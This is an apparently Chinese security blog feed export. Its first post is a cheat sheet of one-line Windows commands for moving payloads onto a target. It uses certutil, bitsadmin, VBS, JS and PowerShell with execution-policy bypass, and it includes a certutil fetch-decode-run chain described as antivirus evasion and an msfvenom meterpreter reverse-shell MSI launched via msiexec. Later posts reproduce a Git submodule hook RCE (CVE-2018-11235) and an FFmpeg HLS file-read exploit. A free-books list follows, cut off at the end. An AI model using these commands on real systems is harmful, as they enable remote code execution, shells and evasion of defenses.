      <url>/2020/12/09/payload-xia-zai-ji-qiao/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇博客整理了多种一句话下载文件的脚本，用于payload迁移</p><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><pre><code># 执行：cscript download.vbs http://39.105.228.43/index.html index.htmlecho set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs# 等价的脚本strFileURL = "http://39.105.228.43/index.html" strHDLocation = "c:\\test\\index.txt" Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")     objXMLHTTP.open "GET", strFileURL, false     objXMLHTTP.send() If objXMLHTTP.Status = 200 Then Set objADOStream = CreateObject("ADODB.Stream") objADOStream.Open objADOStream.Type = 1 objADOStream.Write objXMLHTTP.ResponseBody objADOStream.Position = 0 Set objFSO = CreateObject("Scripting.FileSystemObject") If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation Set objFSO = Nothing objADOStream.SaveToFile strHDLocation objADOStream.Close Set objADOStream = Nothing End if Set objXMLHTTP = Nothing</code></pre><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre><code>certutil.exe -urlcache -split -f http://39.105.228.43/index.html# certutil下载文件会有缓存留下痕迹，应及时删除缓存certutil.exe -urlcache -split -f http://39.105.228.43/index.html delete# 结合certutil的其他用法可以进行简单免杀certutil -urlcache -split -f http://39.105.228.43/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</code></pre><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><pre><code># 需要假设ftp服务器，使用binary模式传输二进制文件否则会损坏echo open 39.105.228.43 21&gt; ftp.txtecho 123&gt;&gt; ftp.txt //userecho 123&gt;&gt; ftp.txt //passwordecho binary &gt;&gt; ftp.txt //bin模式echo get robots.txt &gt;&gt; ftp.txtecho bye &gt;&gt; ftp.txt# 缩短成一句话，需要用户名密码的情形echo open [ftp_server_ip] &gt; o&amp;echo user [username] [passwd] &gt;&gt; o &amp;echo get [filename] &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del /F /Q o# 缩短成一句话，匿名用户echo open [ftp_server_ip] &gt; o&amp;echo get [filename] &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del /F /Q o</code></pre><h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre><code># 最后一个参数需要为绝对路径bitsadmin /rawreturn /transfer down "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html# 可以使用进度条和调整优先级bitsadmin /rawreturn /transfer down /download /priority normal "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html# 第三种方法bitsadmin /rawreturn /transfer getfile "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html# 第四种方法bitsadmin /rawreturn /transfer getpayload "http://39.105.228.43/index.html" C:\\Users\\wander\\index.html# 第五种方法bitsadmin /transfer myDownLoadJob /download /priority normal "http://39.105.228.43/index.html" "C:\\Users\\wander\\index.html"</code></pre><h3 id="Js"><a href="#Js" class="headerlink" title="Js"></a>Js</h3><pre><code># 下载文件并直接打印LANGUAGE="javascript";var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText);# 下载文件并保存LANGUAGE="javascript";var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1;BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("404.html");</code></pre><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>powershell执行get-executionpolicy，若为Restricted则禁止直行脚本，需要管理员权限的powershell设置<code>set-executionpolicy -executionpolicy unrestricted</code></p><pre><code># 低版本powershell基于System.Net.WebClient下载文件$Urls = @()$Urls += "http://39.105.228.43/index.html"$OutPath = "C:\\Users\\wander\\Desktop\\" ForEach ( $item in $Urls) {$file = $OutPath + ($item).split('/')[-1](New-Object System.Net.WebClient).DownloadFile($item, $file) }# powershell 3.0之后可使用Invoke-WebRequest$url = "http://39.105.228.43/index.html"$output = "C:\\Users\\wander\\Desktop\\"$start_time = Get-DateInvoke-WebRequest -Uri $url -OutFile $outputWrite-Output "Time : $((Get-Date).Subtract($start_time).Seconds) second(s)"# 缩短成一句话powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://39.105.228.43/index.html','C:\\Users\\wander\\Desktop\\')</code></pre><h3 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h3><p>msiexec.exe是系统进程，用于安装msi程序，支持远程下载<br>可以先用metasploit生成msi payload，然后在目标机下载执行得到meterpreter</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=172.22.115.182 lport=8888 -f msi &gt; hack.msiuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 172.22.115.182set lport 8888run# 使用msiexec.exe下载msiexec.exe /q /i http://172.22.115.182/hack.msi</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Git远程代码执行漏洞(CVE-2018-11235)</title>
      <link href="/2020/12/08/git-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2018-11235/"/>
      <url>/2020/12/08/git-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2018-11235/</url>
      
        <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Git version &lt; 2.13.7<br>Git version 2.14.x &lt; 2.14.4<br>Git version 2.15.x &lt; 2.15.2<br>Git version 2.16.x &lt; 2.16.4<br>Git version 2.17.x &lt; 2.17.1</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol><li><p>部署攻击方的测试镜像：<code>docker run -d -p 10002:80 medicean/vulapps:g_git_1_exp</code></p></li><li><p>访问<a href="http://118.202.10.43:9000/" target="_blank" rel="noopener">http://118.202.10.43:9000/</a> 生成可实施攻击的仓库<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/d2df70ae38c18d94.png" alt=""></p></li><li><p>在本地使用git clone –recursive  <code>http://118.202.10.43:9000/git/tsQDRioJlF</code>即可触发命令执行<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/d53dabb32e4fb8c3.png" alt=""></p></li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li><p>.gitmodules文件文件中的[submodule]选项的子模块名称存在目录的问题，导致子模块可以在主仓库中被创建（正常情况应为$GIT_DIR/modules/中创建）</p></li><li><p>Git hook是Git工作过程中发生预定义事件时触发的脚本，客户端Git hook是存在本地的，因此若要借此执行恶意脚本需要创建$Git_DIR之外的钩子</p></li><li><p>利用第一点的路径问题，可以将子模块（../../fake/moudles/evil）创建至仓库主目录下，当执行git submoudle update –init时，由于当前路径有正确的子模块，因此会将fake/modules/evil作为路径而非$GIT_DIR/modules/evil</p></li><li><p>构建的.gitmodules形如：</p><pre><code>[submodule "../../modules/evil"]path = evilurl = http://118.202.10.43:9000/git/base.gitupdate = checkout[submodule "base"]path = baseurl = http://118.202.10.43:9000/git/base.git</code></pre></li></ol><h3 id="生成exp的代码"><a href="#生成exp的代码" class="headerlink" title="生成exp的代码"></a>生成exp的代码</h3><p>通过下面代码生成的仓库（hack.git），在其他主机执行git clone –recursive  <code>http://[ip]/hack.git</code>时，即可能触发CVE-2018-11235</p><pre><code>git submodule add http://118.202.10.43:9000/git/base.git evilmkdir modulescp -r .git/modules/evil moduleschmod +x /tmp/evil.sh # 这里是要执行的命令cp /tmp/evil.sh modules/evil/hooks/post-checkoutgit config -f .gitmodules submodule.evil.update checkoutgit config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evilgit add modulesgit submodule add "$repo_submodule"git add base</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="noopener">https://atorralba.github.io/CVE-2018-11235/</a><br><a href="https://www.anquanke.com/post/id/146909#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/146909#h3-8</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FFmpeg 文件读取漏洞(CVE-2017-9993)</title>
      <link href="/2020/12/08/ffmpeg-3.x.x-wen-jian-du-qu-lou-dong/"/>
      <url>/2020/12/08/ffmpeg-3.x.x-wen-jian-du-qu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol><li><p>搭建好环境，访问<a href="http://118.202.10.43:8000/" target="_blank" rel="noopener">http://118.202.10.43:8000/</a></p></li><li><p>选用一个avi文件，使用此<a href="https://raw.githubusercontent.com/neex/ffmpeg-avi-m3u-xbin/master/gen_xbin_avi.py" target="_blank" rel="noopener">脚本</a>生成可利用漏洞的恶意文件</p><p> python3 gen_xbin_avi.py file:///flag out_filename.avi</p></li><li><p>上传恶意文件播放，即可看到读取的文件内容</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/c424e71538bf041b.png" alt=""></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ffmpeg是一个强大的多媒体框架，几乎支持所有格式的多媒体文件的转码、编解码。漏洞产生于ffmpeg对HLS格式的支持。<br>HLS是Apple的动态码率自适应技术，包含一个m3u8索引文件、TS媒体分片文件和key加密串文件。m3u8文件类似于一个配置文件，存放着所有TS媒体分片文件的资源地址和顺序等信息，通常情况下会先将TS资源缓存到本地然后逐片播放，但m3u8也支持远程的视频资源。</p><pre><code>#EXTM3U#EXT-X-MEDIA-SEQUENCE#EXT-X-TARGETDURATION#EXT-X-ALLOW-CACHE#EXT-X-ENDLIST#EXTINF// redrain.ts        真正播放的视频资源http://www.redrain.sb/test.mp4 远程资源</code></pre><p>CVE-2016-1897中的SSRF就是利用m3u8可访问远程资源的特性，利用<code>|</code>将多个url资源合并并访问</p><pre><code>#EXTM3U#EXT-X-TARGETDURATION:6#EXTINF:10.0,concat:http://rr.sb/poc/header.m3u8|file:///tmp/vuln#EXT-X-ENDLIST</code></pre><p>CVE-2017-9993实际是针对ffmpeg对SSRF漏洞封堵的bypass，AVI视频中有个一GAB2数据块用于定义字幕，而m3u8文件可以插入到avi文件中，且ffmpeg仍会对有<code>#EXYM3U</code>文件头的AVI文件做HLS处理，因此能够继续利用CVE-2016-1897漏洞</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>免费计算机书籍汇总</title>
      <link href="/2020/12/02/books/"/>
      <url>/2020/12/02/books/</url>
      
        <content type="html"><![CDATA[<p>原文链接：<a href="https://github.com/ruanyf/free-books" target="_blank" rel="noopener">传送门</a><br>没有注明语种的，都为英语资源。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#目录">目录</a></li><li><a href="#一web-开发">一、Web 开发</a><ul><li><a href="#11-javascript-语言">1.1 JavaScript 语言</a></li><li><a href="#12-其他-web-开发">1.2 其他 Web 开发</a></li></ul></li><li><a href="#二系统管理">二、系统管理</a></li><li><a href="#三编程语言">三、编程语言</a><ul><li><a href="#31-cc">3.1 C，C++</a></li><li><a href="#32-go">3.2 Go</a></li><li><a href="#33-python">3.3 Python</a></li><li><a href="#34-rust">3.4 Rust</a></li><li><a href="#35-其他编程语言">3.5 其他编程语言</a></li></ul></li><li><a href="#四数据库">四、数据库</a></li><li><a href="#五软件开发">五、软件开发</a></li><li><a href="#六人工智能">六、人工智能</a></li><li><a href="#七数学理论">七、数学理论</a><ul><li><a href="#71-微积分">7.1 微积分</a></li><li><a href="#72-统计与概率">7.2 统计与概率</a></li><li><a href="#73-线性代数">7.3 线性代数</a></li><li><a href="#74-密码学">7.4 密码学</a></li><li><a href="#75-其他理论书籍">7.5 其他理论书籍</a></li></ul></li><li><a href="#八其他">八、其他</a></li></ul><h2 id="一、Web-开发"><a href="#一、Web-开发" class="headerlink" title="一、Web 开发"></a>一、Web 开发</h2><h3 id="1-1-JavaScript-语言"><a href="#1-1-JavaScript-语言" class="headerlink" title="1.1 JavaScript 语言"></a>1.1 JavaScript 语言</h3><ol><li>The Modern JavaScript Tutorial（<a href="https://zh.javascript.info/" target="_blank" rel="noopener">中文</a>，<a href="https://javascript.info/" target="_blank" rel="noopener">英文</a>）</li><li><a href="https://github.com/getify/You-Dont-Know-JS" target="_blank" rel="noopener">你不知道的 JS</a></li><li><a href="http://speakingjs.com/" target="_blank" rel="noopener">Speaking JavaScript</a></li><li><a href="https://exploringjs.com/impatient-js/index.html" target="_blank" rel="noopener">急性子程序员的 JavaScript 教程</a></li><li><a href="https://wangdoc.com/javascript/" target="_blank" rel="noopener">JavaScript 语言教程</a>（中文）</li><li><a href="https://github.com/nzakas/understandinges6/tree/master/manuscript" target="_blank" rel="noopener">理解 ES6</a></li><li><a href="https://exploringjs.com/es6/" target="_blank" rel="noopener">探索 ES6</a></li><li><a href="https://exploringjs.com/es2016-es2017.html" target="_blank" rel="noopener">探索 ES2016 和 ES2017</a></li><li><a href="https://exploringjs.com/es2018-es2019/toc.html" target="_blank" rel="noopener">探索 ES2018 和 ES2019</a></li><li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="noopener">ES6 标准入门</a>（中文）</li><li><a href="https://eloquentjavascript.net/" target="_blank" rel="noopener">Eloquent JavaScript（第三版）</a></li><li><a href="https://zenodo.org/record/3707008" target="_blank" rel="noopener">JavaScript 的前20年</a>（JavaScript: The First 20 Years）</li><li><a href="https://exploringjs.com/tackling-ts/" target="_blank" rel="noopener">TypeScript 教程</a></li><li>Node.js 入门（<a href="https://www.nodebeginner.org/index-zh-cn.html" target="_blank" rel="noopener">中文</a>，<a href="https://www.nodebeginner.org/" target="_blank" rel="noopener">英文</a>）</li><li><a href="https://github.com/krasimir/react-in-patterns" target="_blank" rel="noopener">React 编程模式</a></li><li><a href="https://github.com/tyroprogrammer/learn-react-app/tree/master/src/tutorial" target="_blank" rel="noopener">React 应用开发教程</a></li><li><a href="https://leanpub.com/build-react-app-with-atdd" target="_blank" rel="noopener">Acceptance Test Driven Development with React</a></li><li><a href="http://huziketang.mangojuice.top/books/react/" target="_blank" rel="noopener">React.js 小书</a>（中文）</li><li><a href="https://fullstackopen.com/en" target="_blank" rel="noopener">现代 Web 开发</a>：Nodejs + React 的在线互动教程。</li><li><a href="https://github.com/nswbmw/node-in-debugging" target="_blank" rel="noopener">Node.js 调试指南</a></li><li><a href="https://github.com/mjavascript/mastering-modular-javascript" target="_blank" rel="noopener">精通 JavaScript 模块</a></li><li><a href="https://www.robinwieruch.de/the-road-to-graphql-book/" target="_blank" rel="noopener">GraphQL 之路</a></li><li><a href="http://jsdatav.is/intro.html" target="_blank" rel="noopener">JavaScript 数据可视化</a></li><li><a href="https://www.oauth.com/" target="_blank" rel="noopener">OAuth 2.0 Servers</a></li><li><a href="https://www.netlify.com/oreilly-jamstack/" target="_blank" rel="noopener">JAMstack Web 开发</a></li><li><a href="https://sicp.comp.nus.edu.sg/" target="_blank" rel="noopener">SICP（JavaScript 版）</a></li></ol><h3 id="1-2-其他-Web-开发"><a href="#1-2-其他-Web-开发" class="headerlink" title="1.2 其他 Web 开发"></a>1.2 其他 Web 开发</h3><ol><li><a href="https://github.com/bagder/http3-explained" target="_blank" rel="noopener">http3-explained</a></li><li><a href="https://github.com/cssanimation/css-animation-101" target="_blank" rel="noopener">CSS Animation 101</a></li><li><a href="https://practicaltypography.com/" target="_blank" rel="noopener">实用排版指南</a></li><li><a href="https://azure.microsoft.com/en-us/resources/azure-for-architects/" target="_blank" rel="noopener">Azure 介绍（第二版）</a>，<a href="https://github.com/PacktPublishing/Azure-for-Architects" target="_blank" rel="noopener">下载</a></li><li><a href="https://www.ituring.com.cn/book/1421" target="_blank" rel="noopener">Chrome 扩展及应用开发</a>（中文）</li><li><a href="https://landing.google.com/sre/book.html" target="_blank" rel="noopener">网站可靠性工作手册</a></li><li><a href="https://webrtcforthecurious.com/" target="_blank" rel="noopener">WebRTC 教程</a>（WebRTC for the Curious）</li></ol><h2 id="二、系统管理"><a href="#二、系统管理" class="headerlink" title="二、系统管理"></a>二、系统管理</h2><ol><li><a href="http://linuxcommand.org/tlcl.php" target="_blank" rel="noopener">Linux 命令行</a>（The Linux Command Line）, <a href="http://sourceforge.net/projects/linuxcommand/files/TLCL/13.07/TLCL-13.07.pdf/download" target="_blank" rel="noopener">下载</a>，<a href="http://billie66.github.io/TLCL/index.html" target="_blank" rel="noopener">中译</a></li><li><a href="https://hellowebbooks.com/learn-command-line/" target="_blank" rel="noopener">学习命令行</a></li><li><a href="https://linux.vbird.org/linux_basic/centos7/" target="_blank" rel="noopener">鸟哥的 Linux 私房菜</a>（中文）</li><li><a href="https://linuxjourney.com/" target="_blank" rel="noopener">Linux 之旅</a></li><li><a href="http://www.linuxfromscratch.org/lfs/view/10.0-rc1/prologue/foreword.html" target="_blank" rel="noopener">Linux 从零开始</a>（Linux From Scratch）</li><li><a href="https://wangdoc.com/bash/" target="_blank" rel="noopener">Bash 脚本教程</a>（中文）</li><li><a href="https://github.com/dylanaraps/pure-bash-bible" target="_blank" rel="noopener">Pure Bash Bible</a></li><li><a href="http://www.catb.org/~esr/writings/taoup/html/" target="_blank" rel="noopener">Unix 编程艺术</a></li><li><a href="http://bob.cs.sonoma.edu/IntroCompOrg-x64/book.html" target="_blank" rel="noopener">计算机系统导论：以汇编语言与 Linux 系统为例</a></li><li><a href="https://github.com/SystemsApproach/book" target="_blank" rel="noopener">计算机网络：系统方法</a></li><li><a href="http://bob.cs.sonoma.edu/IntroCompOrg-RPi/frontmatter-1.html" target="_blank" rel="noopener">计算机组织导论：以树莓派和 ARM 汇编语言为例</a></li><li><a href="http://cnp3book.info.ucl.ac.be/#" target="_blank" rel="noopener">计算机网络：原理，协议和实践</a></li><li><a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/index.html" target="_blank" rel="noopener">Linux 内核揭密</a>（中文）</li><li><a href="http://www.opsschool.org/" target="_blank" rel="noopener">运维工程师学校（Ops School）</a></li><li><a href="https://www.amazon.com/exec/obidos/ASIN/1558604979/qid=1012094537/sr=8-1/ref=sr_8_71_1/103-9130044-4352613" target="_blank" rel="noopener">文件系统设计</a>（Practical File System Design）, <a href="http://www.nobius.org/~dbg/practical-file-system-design.pdf" target="_blank" rel="noopener">下载</a></li><li><a href="https://docker-curriculum.com/" target="_blank" rel="noopener">Docker 初学者教程</a></li><li><a href="http://aosabook.org/en/" target="_blank" rel="noopener">开源应用程序的体系结构</a></li><li><a href="https://github.com/drduh/macOS-Security-and-Privacy-Guide/blob/master/README-cn.md" target="_blank" rel="noopener">MacOS 的安全和隐私指南</a>（中文）</li></ol><h2 id="三、编程语言"><a href="#三、编程语言" class="headerlink" title="三、编程语言"></a>三、编程语言</h2><h3 id="3-1-C，C"><a href="#3-1-C，C" class="headerlink" title="3.1 C，C++"></a>3.1 C，C++</h3><ol><li><a href="http://cslibrary.stanford.edu/101/EssentialC.pdf" target="_blank" rel="noopener">Essential C</a>（PDF）</li><li><a href="http://modernc.gforge.inria.fr/" target="_blank" rel="noopener">Modern C（第二版）</a></li><li><a href="http://www.isthe.com/chongo/tech/comp/c/index.html" target="_blank" rel="noopener">C 语言学习资料</a></li><li><a href="https://github.com/illinois-cs241/coursebook" target="_blank" rel="noopener">C 语言系统编程</a>（<a href="http://cs241.cs.illinois.edu/coursebook/index.html" target="_blank" rel="noopener">在线阅读</a>）</li><li>C 语言教程：构建 Lisp 编译器（<a href="https://ksco.gitbooks.io/build-your-own-lisp/" target="_blank" rel="noopener">中文</a>，<a href="http://www.buildyourownlisp.com/contents" target="_blank" rel="noopener">英文</a>）</li><li><a href="http://www.avabodh.com/cin/cin.html" target="_blank" rel="noopener">C 语言内部原理</a>（C Internals）</li><li><a href="http://www.icce.rug.nl/documents/cplusplus/" target="_blank" rel="noopener">C++ Annotations</a></li><li><a href="https://github.com/3dgen/cppwasm-book" target="_blank" rel="noopener">C/C++ 面向 wasm 编程—— Emscripten 工程实践</a></li></ol><h3 id="3-2-Go"><a href="#3-2-Go" class="headerlink" title="3.2 Go"></a>3.2 Go</h3><ol><li><a href="https://go101.org/" target="_blank" rel="noopener">Go 101</a></li><li><a href="https://golangbot.com/" target="_blank" rel="noopener">Golangbot 的 Go 语言初级教程</a>，<a href="https://www.yuque.com/ksco/ogg7um" target="_blank" rel="noopener">中译</a></li><li><a href="https://github.com/chai2010/advanced-go-programming-book" target="_blank" rel="noopener">Go 高级编程</a></li><li><a href="https://dave.cheney.net/high-performance-go-workshop/gopherchina-2019.html" target="_blank" rel="noopener">高性能 Go 代码工坊</a></li><li><a href="https://www.digitalocean.com/community/books/how-to-code-in-go-ebook" target="_blank" rel="noopener">Go 语言编程</a>（How To Code in Go）</li></ol><h3 id="3-3-Python"><a href="#3-3-Python" class="headerlink" title="3.3 Python"></a>3.3 Python</h3><ol><li><a href="https://archive.org/details/2018Fundamentals.ofPython" target="_blank" rel="noopener">Python 编程基础</a>（PDF）</li><li><a href="https://github.com/webartifex/intro-to-python" target="_blank" rel="noopener">Python 编程入门</a></li><li><a href="https://thomas-cokelaer.info/tutorials/python/index.html" target="_blank" rel="noopener">Python 语法笔记</a></li><li><a href="http://www.freetechbooks.com/introduction-to-python-for-computational-science-and-engineering-t884.html" target="_blank" rel="noopener">Python 科学应用入门</a>（Introduction to Python for Computational Science and Engineering）, <a href="http://www.southampton.ac.uk/~fangohr/training/python/pdfs/Python-for-Computational-Science-and-Engineering.pdf" target="_blank" rel="noopener">下载</a></li><li><a href="https://github.com/jackfrued/Python-100-Days" target="_blank" rel="noopener">Python - 100天从新手到大师</a>（中文）</li><li><a href="https://python.swaroopch.com/" target="_blank" rel="noopener">A Byte of Python</a>，中译：<a href="https://bop.mol.uno/" target="_blank" rel="noopener">简明 Python 教程</a></li><li><a href="https://www.dbooks.org/invent-your-own-computer-games-with-python-1503212300/" target="_blank" rel="noopener">使用 Python 写一个自己的游戏</a></li><li><a href="https://docs.python-guide.org/" target="_blank" rel="noopener">The Hitchhiker’s Guide to Python!</a>，中译：<a href="https://pythonguidecn.readthedocs.io/zh/latest/" target="_blank" rel="noopener">Python 开发最佳实践指南</a></li><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400" target="_blank" rel="noopener">廖雪峰 Python 教程</a>（中文）</li><li><a href="http://projectpython.net/chapter00/" target="_blank" rel="noopener">Python 语言互动教程</a></li><li><a href="http://interactivepython.org/runestone/static/pythonds/index.html" target="_blank" rel="noopener">Python 算法与数据结构</a>（第二版），<a href="https://github.com/facert/python-data-structure-cn" target="_blank" rel="noopener">中译</a></li><li>SICP（Python 版）（<a href="https://wizardforcel.gitbooks.io/sicp-in-python/content/" target="_blank" rel="noopener">英文</a>，<a href="https://github.com/wizardforcel/sicp-py-zh" target="_blank" rel="noopener">中文</a>）</li><li><a href="https://github.com/jakevdp/PythonDataScienceHandbook" target="_blank" rel="noopener">Python 数据科学手册</a></li><li><a href="https://www.obeythetestinggoat.com/pages/book.html#toc" target="_blank" rel="noopener">Test-Driven Web Development with Python</a></li><li><a href="https://automatetheboringstuff.com/" target="_blank" rel="noopener">Automate the Boring Stuff with Python</a></li><li><a href="https://www.digitalocean.com/community/tutorials/digitalocean-ebook-how-to-code-in-python" target="_blank" rel="noopener">如何使用 Python3 编程</a></li><li><a href="http://socialdata.site/" target="_blank" rel="noopener">社交媒体挖掘</a></li><li><a href="https://www.digitalocean.com/community/tutorials/machine-learning-projects-python-a-digitalocean-ebook" target="_blank" rel="noopener">数据科学项目 Python 实战</a></li><li><a href="https://www.zmrenwu.com/courses/HelloDjango-blog-tutorial/" target="_blank" rel="noopener">HelloDjango - Django 博客教程</a>（中文）</li><li><a href="https://lectures.quantecon.org/_downloads/pdf/py/Quantitative%20Economics%20with%20Python.pdf" target="_blank" rel="noopener">使用 Python 学习计量经济学</a>（PDF）</li><li><a href="https://github.com/CamDavidsonPilon/Probabilistic-Programming-and-Bayesian-Methods-for-Hackers" target="_blank" rel="noopener">黑客的贝叶斯方法：以 Python 为例</a></li><li><a href="https://www.cs.auckland.ac.nz/compsci105s1c/resources/ProblemSolvingwithAlgorithmsandDataStructures.pdf" target="_blank" rel="noopener">解决算法和数据结构问题（Python 版）</a>（Problem Solving with Algorithms and Data Structures）</li></ol><h3 id="3-4-Rust"><a href="#3-4-Rust" class="headerlink" title="3.4 Rust"></a>3.4 Rust</h3><ol><li><a href="https://stevedonovan.github.io/rust-gentle-intro/readme.html" target="_blank" rel="noopener">Rust 语言导论</a></li><li><a href="https://www.jyotirmoy.net/posts/2018-12-01-rust-book.html" target="_blank" rel="noopener">Rust 编程语言</a></li><li><a href="https://doc.rust-lang.org/stable/rust-by-example/index.html" target="_blank" rel="noopener">Rust By Example</a></li></ol><h3 id="3-5-其他编程语言"><a href="#3-5-其他编程语言" class="headerlink" title="3.5 其他编程语言"></a>3.5 其他编程语言</h3><ol><li><a href="https://agda-zh.github.io/PLFA-zh/" target="_blank" rel="noopener">编程语言基础：Agda 语言描述</a>（中文）</li><li><a href="https://ia802309.us.archive.org/25/items/pdfy-MgN0H1joIoDVoIC7/The_AWK_Programming_Language.pdf" target="_blank" rel="noopener">Awk 编程语言</a></li><li><a href="https://www.tutlane.com/tutorial/csharp/csharp-tutorial" target="_blank" rel="noopener">C# 语言免费教程</a></li><li><a href="http://www.sicpdistilled.com/" target="_blank" rel="noopener">SICP（Clojure 版）</a></li><li><a href="https://www.braveclojure.com/clojure-for-the-brave-and-true/" target="_blank" rel="noopener">Clojure for the Brave and True</a></li><li><a href="https://www.learn-clojurescript.com/" target="_blank" rel="noopener">学习 ClojureScript</a></li><li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744" target="_blank" rel="noopener">廖雪峰 Java 教程</a>（中文）</li><li><a href="https://benlauwens.github.io/ThinkJulia.jl/latest/book.html" target="_blank" rel="noopener">计算机科学：以 Julia 语言为例</a></li><li><a href="https://people.smp.uq.edu.au/YoniNazarathy/julia-stats/StatisticsWithJulia.pdf" target="_blank" rel="noopener">使用 Julia 语言学习统计学</a>（PDF）</li><li><a href="http://fleurer.github.io/lyah/" target="_blank" rel="noopener">Haskell 趣学指南</a>（中文）</li><li><a href="http://cnhaskell.com/index.html" target="_blank" rel="noopener">Real World Haskell 中文版</a>（中文）</li><li><a href="https://en.wikibooks.org/wiki/Write_Yourself_a_Scheme_in_48_Hours" target="_blank" rel="noopener">Haskell 语言48小时教程</a></li><li><a href="http://dev.stephendiehl.com/hask/" target="_blank" rel="noopener">Haskell 语言入门</a></li><li><a href="http://www.gigamonkeys.com/book/" target="_blank" rel="noopener">Common Lisp 实战教程</a></li><li><a href="http://www.lisperati.com/casting.html" target="_blank" rel="noopener">Lisp 漫画教程</a>（Casting Spels in Lisp）</li><li><a href="http://ssalewski.de/nimprogramming.html" target="_blank" rel="noopener">Nim 语言编程</a></li><li><a href="http://www.cs.cornell.edu/courses/cs3110/2019sp/textbook/" target="_blank" rel="noopener">OCaml 语言在线教程</a></li><li><a href="https://hop.perl.plover.com/" target="_blank" rel="noopener">高阶 Perl</a></li><li><a href="https://mitpress.mit.edu/books/art-prolog-second-edition" target="_blank" rel="noopener">Prolog 的艺术</a>（The art of Prolog）</li><li><a href="https://i-love-ruby.gitlab.io/" target="_blank" rel="noopener">我爱 Ruby</a></li><li><a href="https://www.railstutorial.org/book" target="_blank" rel="noopener">Ruby on Rails Tutorial</a></li><li><a href="https://yurichev.com/writings/AL4B-EN.pdf" target="_blank" rel="noopener">汇编语言初学者教程</a>（PDF）</li><li><a 